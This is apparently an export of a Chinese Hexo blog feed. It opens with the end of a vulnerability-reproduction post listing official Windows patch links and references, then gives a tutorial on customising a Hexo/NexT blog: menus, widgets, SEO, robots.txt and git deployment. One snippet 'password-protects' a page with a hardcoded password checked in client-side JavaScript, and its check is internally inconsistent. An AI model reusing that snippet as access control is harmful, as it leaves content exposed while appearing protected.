x86</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu</a></td></tr><tr><td>Windows Server 2008 R2 Itanium</td><td><a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu</a></td></tr><tr><td>Windows Server 2008 R2 x64</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a></td></tr><tr><td>Windows Server 2003 x86</td><td><a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe</a></td></tr><tr><td>Windows Server 2003 x64</td><td><a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</a></td></tr><tr><td>Windows XP SP3</td><td><a href="http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe" rel="external nofollow" target="_blank">http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe</a></td></tr><tr><td>Windows XP SP2 for x64</td><td><a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe</a></td></tr><tr><td>Windows XP SP3 for XPe</td><td><a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</a></td></tr><tr><td>WES09 and POSReady 2009</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe</a></td></tr></tbody></table><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1.<a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247486173&amp;idx=1&amp;sn=ceeda162e4b222f0eefefe4ea3a119c4&amp;chksm=fe250fdcc95286ca3d3b42afaa10332280dc65f7446e0890533a16db4e9e70676c471f241c6c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1567899813398&amp;sharer_shareid=6f6b067210760c063002d1df45d5d844#rd" rel="external nofollow" target="_blank">360微信推文</a></p><p>2.<a href="https://mp.weixin.qq.com/s/yvlMPjkrxFlu70bf-aLbYA" rel="external nofollow" target="_blank">xsser博客复现</a></p><p>3.<a href="https://github.com/rapid7/metasploit-framework/pull/12283?from=groupmessage&amp;isappinstalled=0" rel="external nofollow" target="_blank">github项目</a></p><p>4.<a href="http://blog.xkkhh.cn/archives/535" rel="external nofollow" target="_blank">xkkhh复现</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客DIY</title>
      <link href="/3f4d2b3b.html"/>
      <url>/3f4d2b3b.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019082101.jpg" alt=""></p><a id="more"></a><h1 id="博客DIY1-0"><a href="#博客DIY1-0" class="headerlink" title="博客DIY1.0"></a>博客<code>DIY1.0</code></h1><h2 id="HTML页面编辑"><a href="#HTML页面编辑" class="headerlink" title="HTML页面编辑"></a>HTML页面编辑</h2><h2 id="新增菜单栏"><a href="#新增菜单栏" class="headerlink" title="新增菜单栏"></a>新增菜单栏</h2><h3 id="新建文件夹"><a href="#新建文件夹" class="headerlink" title="新建文件夹"></a>新建文件夹</h3><p>在hexo &gt; source文件夹中会生成一个studylink文件夹</p><blockquote><p>hexo new page “studylink”</p></blockquote><h3 id="在菜单中添加链接"><a href="#在菜单中添加链接" class="headerlink" title="在菜单中添加链接"></a>在菜单中添加链接</h3><p>编辑主题的<code>_config.yml</code>，在<code>menu</code>中的添加如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">studylink: /studylink/ || battery</span><br></pre></td></tr></table></figure><blockquote><p><code>||</code>之前的值是目标链接，之后的是分类页面的图标，图标名称来自于<a href="http://fontawesome.io/icons/" rel="external nofollow" target="_blank">FontAwesome icon</a>。若没有配置图标，默认会使用问号图标。</p></blockquote><h3 id="新添加的菜单需要翻译对应的中文"><a href="#新添加的菜单需要翻译对应的中文" class="headerlink" title="新添加的菜单需要翻译对应的中文"></a>新添加的菜单需要翻译对应的中文</h3><p>打开<code>hexo&gt;theme&gt;next&gt;languages&gt;zh-Hans.yml</code>，在menu下添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">studylink: 充电</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://hoxis.github.io/Hexo+Next 新增菜单分类页面.html" rel="external nofollow" target="_blank">Hexo+Next 添加菜单分类页面</a></p><h2 id="添加revolvermaps"><a href="#添加revolvermaps" class="headerlink" title="添加revolvermaps"></a>添加revolvermaps</h2><p>官方地址：<a href="https://www.revolvermaps.com/?target=setup" rel="external nofollow" target="_blank">点击进入</a></p><p>将代码复制到相应的页面</p><p>侧边栏设置在<code>／themes/next/layout/_macro/sidebar.swig</code>找到自己觉得合适的地方写入相应的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;# visitmap #&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"xxxx"</span> <span class="attr">async</span>=<span class="string">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="添加时钟flash"><a href="#添加时钟flash" class="headerlink" title="添加时钟flash"></a>添加时钟flash</h2><p>有趣的人体时钟<code>HONE HONE CLOCK</code>，作者是个日本人，点击<a href="http://chabudai.org/blog/" rel="external nofollow" target="_blank">此处</a>访问作者博客。我将他添加在了侧边栏，方法同上<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--人体时钟背景透明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">charset</span>=<span class="string">"Shift_JIS"</span> <span class="attr">src</span>=<span class="string">"http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_tr.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--人体时钟背景白--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">charset</span>=<span class="string">"Shift_JIS"</span> <span class="attr">src</span>=<span class="string">"http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_wh.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="https://www.itrhx.com/2018/08/27/A04-Hexo-blog-topic-personalization/" rel="external nofollow" target="_blank">参考文章</a></p><p>或者创建 js 文件 hone_hone_clock.js</p><p>在<code>next\source\js\src</code>文件夹下创建<code>hone_hone_clock.js</code>，添加代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/*hone-hone-clock*/</span><br><span class="line">!function (e, t, a) &#123; </span><br><span class="line">  /* code */</span><br><span class="line">  var initClock = function()&#123;</span><br><span class="line">    var sHtml = '';</span><br><span class="line">    sHtml += '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: fixed;right: 10px;top: 20px;width: 160px;height: 70px;"</span>&gt;</span>';</span><br><span class="line">    sHtml += '  <span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"</span> <span class="attr">codebase</span>=<span class="string">"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0"</span> <span class="attr">width</span>=<span class="string">"160"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">id</span>=<span class="string">"honehoneclock"</span> <span class="attr">align</span>=<span class="string">"middle"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span>=<span class="string">"http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_tr.swf"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"quality"</span> <span class="attr">value</span>=<span class="string">"high"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"bgcolor"</span> <span class="attr">value</span>=<span class="string">"#ffffff"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"wmode"</span> <span class="attr">value</span>=<span class="string">"transparent"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;<span class="name">embed</span> <span class="attr">wmode</span>=<span class="string">"transparent"</span> <span class="attr">src</span>=<span class="string">"http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_tr.swf"</span> <span class="attr">quality</span>=<span class="string">"high"</span> <span class="attr">bgcolor</span>=<span class="string">"#ffffff"</span> <span class="attr">width</span>=<span class="string">"160"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">name</span>=<span class="string">"honehoneclock"</span> <span class="attr">align</span>=<span class="string">"middle"</span> <span class="attr">allowscriptaccess</span>=<span class="string">"always"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-flash"</span> <span class="attr">pluginspage</span>=<span class="string">"http://www.macromedia.com/go/getflashplayer"</span>&gt;</span>';</span><br><span class="line">    sHtml += '    <span class="tag">&lt;/<span class="name">object</span>&gt;</span>';</span><br><span class="line">    sHtml += '<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span><br><span class="line">    </span><br><span class="line">    t = t || document;    </span><br><span class="line">    t.write(sHtml);</span><br><span class="line">  &#125;</span><br><span class="line">  initClock();</span><br><span class="line">&#125;(window, document);</span><br></pre></td></tr></table></figure><p><strong>引用</strong></p><p>在<code>next\layout\_layout.swig</code>文件中，添加引用（注：在 swig 末尾添加）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--clock--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/src/hone_hone_clock.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://www.missfli.com/2018/05/29/github-hexo-next-07.html" rel="external nofollow" target="_blank">参考文章</a></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019081901.gif" alt=""></p><p>ps:用户访问手动开启flash支持,不太方便我实现后就把它删除了</p><h2 id="博客seo优化"><a href="#博客seo优化" class="headerlink" title="博客seo优化"></a>博客seo优化</h2><h3 id="打开Next主题自带的seo配置"><a href="#打开Next主题自带的seo配置" class="headerlink" title="打开Next主题自带的seo配置"></a>打开Next主题自带的seo配置</h3><p>打开<strong>主题</strong>配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">canonical: true</span><br><span class="line">seo: true</span><br><span class="line">index_with_subtitle: true</span><br><span class="line">baidu_push: true</span><br></pre></td></tr></table></figure><h3 id="添加sitemap"><a href="#添加sitemap" class="headerlink" title="添加sitemap"></a>添加sitemap</h3><p>这一步目的在于告诉搜索引擎你的站点结构。</p><h3 id="sitemap生成插件的安装和配置"><a href="#sitemap生成插件的安装和配置" class="headerlink" title="sitemap生成插件的安装和配置"></a>sitemap生成插件的安装和配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure><h3 id="在站点配置文件中添加sitemap的生成路径"><a href="#在站点配置文件中添加sitemap的生成路径" class="headerlink" title="在站点配置文件中添加sitemap的生成路径"></a>在<strong>站点</strong>配置文件中添加sitemap的生成路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sitemap: </span><br><span class="line">    path: sitemap.xml</span><br><span class="line">baidusitemap:</span><br><span class="line">    path: baidusitemap.xml</span><br></pre></td></tr></table></figure><p>现在执行 hexo g 生成以后应该可以访问sitemap.xml和baidusitemap.xml</p><h3 id="提交sitemap"><a href="#提交sitemap" class="headerlink" title="提交sitemap"></a>提交sitemap</h3><p>github好像屏蔽了百度的爬虫，所以即使提交了sitemap，也可能出现无法爬下来的情况。于是我们需要主动向百度提交链接。<br>安装插件hexo-baidu-url-submit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-baidu-url-submit --save</span><br></pre></td></tr></table></figure></p><p>在站点配置文件中添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">baidu_url_submit:</span><br><span class="line">  count: 1 ## 提交最新的一个链接</span><br><span class="line">  host:  ## 在百度站长平台中注册的域名</span><br><span class="line">  token: your_token ## 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!</span><br><span class="line">  path: baidu_urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里</span><br></pre></td></tr></table></figure></p><p>在站点配置文件的deploy下仿照github的类型添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - type: git # 原来就有的</span><br><span class="line">    repo: 巴拉巴拉</span><br><span class="line">    branch: master</span><br><span class="line">    message: blog update</span><br><span class="line">  </span><br><span class="line">  - type: baidu_url_submitter # 注意，这个为新增的</span><br></pre></td></tr></table></figure></p><blockquote><p>记得改成上面那种形式，type前面有一个-，然后下面的配置项和type对齐。</p></blockquote><h3 id="添加蜘蛛协议"><a href="#添加蜘蛛协议" class="headerlink" title="添加蜘蛛协议"></a>添加蜘蛛协议</h3><p>蜘蛛协议就是告诉爬虫，你的哪些文件爬虫可以爬取，哪些不能的文件。</p><p>新建一个robots.txt文件，添加以下内容，然后放到/yoursite/source/文件夹下面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#hexo robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Allow: /categories/</span><br><span class="line">Allow: /tags/</span><br><span class="line"></span><br><span class="line">Disallow: /js/</span><br><span class="line">Disallow: /css/</span><br><span class="line">Disallow: /fonts/</span><br><span class="line"></span><br><span class="line">Sitemap: https://7iny.jxustctf.top/search.xml</span><br><span class="line">Sitemap: https://7iny.jxustctf.top/sitemap.xml</span><br><span class="line">Sitemap: https://7iny.jxustctf.top/baidusitemap.xml</span><br></pre></td></tr></table></figure></p><p>执行hexo clean，hexo g -d，就同步到了coding上了。</p><h3 id="百度HTML验证"><a href="#百度HTML验证" class="headerlink" title="百度HTML验证"></a>百度HTML验证</h3><p>在<strong>站点配置</strong>文件中，添加这样一个配置项:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baidu_site_verification: 刚刚复制的一串字符</span><br></pre></td></tr></table></figure></p><p>修改文件，路径D<code>\themes\next\layout\_partials\head.swig</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.baidu_site_verification %&#125;</span><br><span class="line">  &lt;meta name=&quot;baidu-site-verification&quot; content=&quot;HTML验证的一串字符&quot; /&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p><h3 id="谷歌SEO"><a href="#谷歌SEO" class="headerlink" title="谷歌SEO"></a>谷歌SEO</h3><p>同理，在<a href="https://www.google.com/webmasters/" rel="external nofollow" target="_blank">谷歌收入站点</a>提交即可</p><h3 id="禁止爬虫跟踪外链"><a href="#禁止爬虫跟踪外链" class="headerlink" title="禁止爬虫跟踪外链"></a>禁止爬虫跟踪外链</h3><p>当你提交了链接，写好了蜘蛛爬取协议之后，搜索引擎的蜘蛛就会来爬取你的文章内容。但是，如果你的文章中有外链，蜘蛛就会通过这个链接到别人的站点去。如果这个站点是友情链接还好，如果是非友链，就回严重影响网站的爬取。</p><p>为了避免蜘蛛进入非友情链接，需要为非友链添加上<code>nofollow</code>属性。推荐使用<code>hexo-autonofollow</code>插件。</p><p>在站点根目录下执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-autonofollow --save</span><br></pre></td></tr></table></figure><p>修改<strong>站点配置文件</strong>，添加如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nofollow:</span><br><span class="line">    enable: true</span><br><span class="line">    exclude: # 例外链接</span><br><span class="line">    - 你自己的站点地址</span><br><span class="line">    - 友链地址</span><br></pre></td></tr></table></figure><p>这样，例外的链接就不会被加上<code>nofollow</code>属性。</p><ul><li>插件自动添加的属性为<code>external nofollow noopener noreferrer</code>。一般来说标准的<code>nofollow</code>属性只需要<code>external nofollow</code>即可，<code>noopener noreferrer</code>估计是新闻上说的钓鱼漏洞的补救方法，不过这条属性会影响站长工具的友链检测。</li></ul><p>如果想要去掉<code>noopener noreferrer</code>，修改<code>/yoursite/node_modules/hexo-autonofollowlib/filter.js</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rel: &apos;external nofollow noopener noreferrer&apos;</span><br></pre></td></tr></table></figure><p>去掉其中的<code>noopener noreferrer</code>，再生成即可。</p><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://dugblog.coding.me/Hexo/20180625-Hexo-SEO.html" rel="external nofollow" target="_blank">seo优化</a></p><h2 id="实验室静态介绍页面"><a href="#实验室静态介绍页面" class="headerlink" title="实验室静态介绍页面"></a>实验室静态介绍页面</h2><h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p>使用github,方法与创建个人博客一致。实验室<a href="https://lab.jxustctf.top/" rel="external nofollow" target="_blank">对外交流页面</a></p><h3 id="git的用法"><a href="#git的用法" class="headerlink" title="git的用法"></a>git的用法</h3><h4 id="git-clone到本机"><a href="#git-clone到本机" class="headerlink" title="git clone到本机"></a>git clone到本机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//注意要换成自己的github仓库地址</span><br><span class="line">git clone https://github.com/xxx/xxx.github.io.git</span><br></pre></td></tr></table></figure><h4 id="push到github"><a href="#push到github" class="headerlink" title="push到github"></a>push到github</h4><p>打开git客户端并执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;初始化个人主页仓库&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>强行更新</p><blockquote><p>git push -u origin +master</p></blockquote><p><a href="https://www.cnblogs.com/viagraHero/p/7929546.html" rel="external nofollow" target="_blank">参考文章</a></p><h4 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h4><p>直接解析域名的CNAME记录到你的Git二级域名，不要使用方法一中的A记录，因为ip地址可能会一段时间之后会改变，所以建议记录类型选择CNAME进行解析，记录值填的就是username.github.io</p><p><a href="https://blog.enjoytoshare.club/article/hexo-do-domain.html" rel="external nofollow" target="_blank">参考文章</a></p><h4 id="gif截图工具"><a href="#gif截图工具" class="headerlink" title="gif截图工具"></a>gif截图工具</h4><p>gifcam中文版 : <a href="https://gifcam.en.softonic.com/" rel="external nofollow" target="_blank">官网</a></p><p>gif在线压缩：<a href="http://docsmall.com/gif-compress" rel="external nofollow" target="_blank">官网</a></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190809.gif" alt=""></p><h3 id="sitemap-xml在线生成"><a href="#sitemap-xml在线生成" class="headerlink" title="sitemap.xml在线生成"></a>sitemap.xml在线生成</h3><p>1.打开<a href="https://www.xml-sitemaps.com/" rel="external nofollow" target="_blank">网站地图制作工具</a></p><p>2.输入url，点击开始</p><p>3.下载放在根目录</p><h3 id="页面添加密码"><a href="#页面添加密码" class="headerlink" title="页面添加密码"></a>页面添加密码</h3><p>HTML顶部或headn之间添加以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">password</span>(<span class="params"></span>) </span>&#123;   </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> testV = <span class="number">1</span>;   </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pass1 = prompt(<span class="string">'请输入密码'</span>,<span class="string">''</span>);   </span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> (testV &lt; <span class="number">3</span>) &#123;   </span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (!pass1)   </span></span><br><span class="line"><span class="undefined">history.go(-1);   </span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (pass1 == <span class="string">"123"</span>) &#123;<span class="comment">//初始密码123   </span></span></span><br><span class="line"><span class="javascript">alert(<span class="string">'密码正确'</span>);   </span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;   </span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="undefined">testV+=1;   </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pass1 =   </span></span><br><span class="line"><span class="javascript">prompt(<span class="string">'密码错误!请重新输入:'</span>);   </span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (pass1!=<span class="string">"password"</span> &amp; testV ==<span class="number">3</span>)   </span></span><br><span class="line"><span class="undefined">history.go(-1);   </span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="string">" "</span>;   </span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(password());   </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--下面添加你要显示的内容或者代码--&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://www.xxinn.cn/code/439.html" rel="external nofollow" target="_blank">参考文章</a></p><h1 id="博客DIY2-0"><a href="#博客DIY2-0" class="headerlink" title="博客DIY2.0"></a>博客<code>DIY2.0</code></h1><h2 id="彩色标签页"><a href="#彩色标签页" class="headerlink" title="彩色标签页"></a>彩色标签页</h2><p> 在/themes/next/layout/目录下，新增tag-color.swig文件，填入如下内容： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">     var alltags = document.getElementsByClassName(&apos;tag-cloud-tags&apos;);</span><br><span class="line">     var tags = alltags[0].getElementsByTagName(&apos;a&apos;);</span><br><span class="line">     for (var i = tags.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">       var r=Math.floor(Math.random()*75+130);</span><br><span class="line">       var g=Math.floor(Math.random()*75+100);</span><br><span class="line">       var b=Math.floor(Math.random()*75+80);</span><br><span class="line">       